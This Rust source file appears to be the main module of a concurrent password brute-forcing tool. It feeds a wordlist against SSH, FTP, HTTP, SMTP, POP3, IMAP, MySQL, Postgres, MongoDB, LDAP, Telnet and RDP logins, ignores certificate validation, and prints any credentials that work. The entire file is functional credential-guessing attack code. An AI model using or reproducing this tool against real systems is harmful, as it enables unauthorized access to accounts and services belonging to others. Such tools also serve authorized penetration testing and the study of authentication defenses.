mod args;
mod header;

use args::SupArgs;
use clap::Parser;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt, BufReader};
use colored::*;
use ssh2::Session;
use reqwest::Client;
use suppaftp::AsyncFtpStream;
use base64::{engine::general_purpose, Engine as _};
use native_tls::TlsConnector;
use tokio::process::Command;
use mongodb::{options::ClientOptions, Client as MongoClient};
use ldap3::{LdapConnAsync, LdapResult};

// --- UTILITAIRE TLS ---
async fn connect_tls(host: &str, port: u16) -> Option<tokio_native_tls::TlsStream<tokio::net::TcpStream>> {
    let addr = format!("{}:{}", host, port);
    let connector = TlsConnector::builder().danger_accept_invalid_certs(true).build().ok()?;
    let tokio_connector = tokio_native_tls::TlsConnector::from(connector);
    let stream = tokio::net::TcpStream::connect(&addr).await.ok()?;
    tokio_connector.connect(host, stream).await.ok()
}

// --- MODULES DE CONNEXION ---

async fn attempt_ssh(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", host, port);
    let (u, p) = (user.to_string(), pass.to_string());
    tokio::task::spawn_blocking(move || {
        let tcp = std::net::TcpStream::connect(&addr).ok()?;
        let mut sess = Session::new().ok()?;
        sess.set_tcp_stream(tcp);
        sess.handshake().ok()?;
        if sess.userauth_password(&u, &p).is_ok() && sess.authenticated() { return Some(()); }
        None
    }).await.unwrap_or(None).is_some()
}

async fn attempt_http(client: &Client, target: &str, port: u16, user: &str, pass: &str, error_msg: &Option<String>) -> bool {
    let url = if target.starts_with("http") {
        target.to_string()
    } else {
        let proto = if port == 443 { "https" } else { "http" };
        format!("{}://{}:{}", proto, target, port)
    };
    match error_msg {
        Some(msg) => {
            let params = [("user", user), ("pass", pass)];
            if let Ok(res) = client.post(&url).form(&params).send().await {
                if let Ok(text) = res.text().await { return !text.contains(msg); }
            }
        }
        None => {
            if let Ok(res) = client.get(&url).basic_auth(user, Some(pass)).send().await {
                return res.status().is_success() || res.status().is_redirection();
            }
        }
    }
    false
}

// --- MAILS ---
async fn attempt_smtp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"EHLO localhost\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"AUTH LOGIN\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(user)).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(pass)).as_bytes()).await;
        let n = s.read(&mut buf).await.unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("235");
    }
    false
}

async fn attempt_pop3(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("USER {}\r\n", user).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("PASS {}\r\n", pass).as_bytes()).await;
        let n = s.read(&mut buf).await.unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("+OK");
    }
    false
}

async fn attempt_imap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("A1 LOGIN {} {}\r\n", user, pass).as_bytes()).await;
        let n = s.read(&mut buf).await.unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("A1 OK");
    }
    false
}

// --- DATABASES & LDAP ---
async fn attempt_mysql(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("mysql://{}:{}@{}:{}", user, pass, host, port);
    sqlx::MySqlPool::connect(&url).await.is_ok()
}

async fn attempt_postgres(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("postgres://{}:{}@{}:{}/postgres", user, pass, host, port);
    sqlx::PgPool::connect(&url).await.is_ok()
}

async fn attempt_mongodb(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let uri = format!("mongodb://{}:{}@{}:{}/", user, pass, host, port);
    if let Ok(opt) = ClientOptions::parse(uri).await {
        if let Ok(c) = MongoClient::with_options(opt) { return c.list_database_names(None, None).await.is_ok(); }
    }
    false
}

async fn attempt_ldap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("ldap://{}:{}", host, port);
    let user = user.to_string();
    let pass = pass.to_string();
    
    // Utilisation de la version synchrone pour garantir la compatibilité
    tokio::task::spawn_blocking(move || {
        use ldap3::LdapConn;
        if let Ok(mut ldap) = LdapConn::new(&addr) {
            return ldap.simple_bind(&user, &pass).is_ok();
        }
        false
    }).await.unwrap_or(false)
}

async fn attempt_telnet(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Ok(mut s) = tokio::net::TcpStream::connect(format!("{}:{}", host, port)).await {
        let mut b = [0; 1024];
        let _ = s.read(&mut b).await;
        let _ = s.write_all(format!("{}\n", user).as_bytes()).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        let _ = s.write_all(format!("{}\n", pass).as_bytes()).await;
        let n = s.read(&mut b).await.unwrap_or(0);
        let res = String::from_utf8_lossy(&b[..n]).to_lowercase();
        return !res.contains("incorrect") && !res.contains("failed");
    }
    false
}

async fn attempt_rdp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let out = Command::new("xfreerdp")
        .args(["/v:", &format!("{}:{}", host, port), "/u:", user, "/p:", pass, "+auth-only", "/cert-ignore"])
        .output().await;
    out.map(|o| o.status.success()).unwrap_or(false)
}

// --- MAIN ENGINE ---
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    header::show("Cheikh ELghadi", "https://github.com/23092-ctrl");
    let args = SupArgs::parse();
    let semaphore = Arc::new(Semaphore::new(args.threads));
    let client = Arc::new(Client::builder().danger_accept_invalid_certs(true).build()?);

    let file = File::open(&args.wordlist).await?;
    let mut lines = BufReader::new(file).lines();
    let mut tasks = vec![];

    println!("{} Target: {} | Service: {}", "[*]".blue(), args.target.bold(), args.service.cyan());

    while let Some(password) = lines.next_line().await? {
        let permit = Arc::clone(&semaphore).acquire_owned().await?;
        let (t, u, s, e, p_arg) = (args.target.clone(), args.user.clone(), args.service.to_lowercase(), args.error.clone(), args.port);
        let h_client = Arc::clone(&client);
        
        let p = p_arg.unwrap_or(match s.as_str() {
            "ssh" => 22, "ftp" => 21, "telnet" => 23, "smtp" => 465, "pop3" => 995, 
            "imap" => 993, "mysql" => 3306, "postgres" => 5432, "mongodb" => 27017,
            "ldap" => 389, "rdp" => 3389, "http" => 80, "https" => 443, _ => 0,
        });

        let handle = tokio::spawn(async move {
            let _permit = permit;
            let ok = match s.as_str() {
                "ssh"      => attempt_ssh(&t, p, &u, &password).await,
                "smtp"     => attempt_smtp(&t, p, &u, &password).await,
                "pop3"     => attempt_pop3(&t, p, &u, &password).await,
                "imap"     => attempt_imap(&t, p, &u, &password).await,
                "mysql"    => attempt_mysql(&t, p, &u, &password).await,
                "postgres" => attempt_postgres(&t, p, &u, &password).await,
                "mongodb"  => attempt_mongodb(&t, p, &u, &password).await,
                "ldap"     => attempt_ldap(&t, p, &u, &password).await,
                "telnet"   => attempt_telnet(&t, p, &u, &password).await,
                "rdp"      => attempt_rdp(&t, p, &u, &password).await,
                "http" | "https" => attempt_http(&h_client, &t, p, &u, &password, &e).await,
                "ftp"      => {
                    if let Ok(mut ftp) = AsyncFtpStream::connect(format!("{}:{}", t, p)).await {
                        ftp.login(&u, &password).await.is_ok()
                    } else { false }
                },
                _ => false,
            };

           if ok {
                println!("\n{}", "====================================================".green());
                println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
                println!("{} Utilisateur : {}", " > ".green(), u.bold()); // Changé 'user' par 'u'
                println!("{} Mot de passe : {}", " > ".green(), password.yellow().bold());
                println!("{}\n", "====================================================".green());
                std::process::exit(0); 
            }
        });
        tasks.push(handle);
    }
    for t in tasks { let _ = t.await; }
    Ok(())
}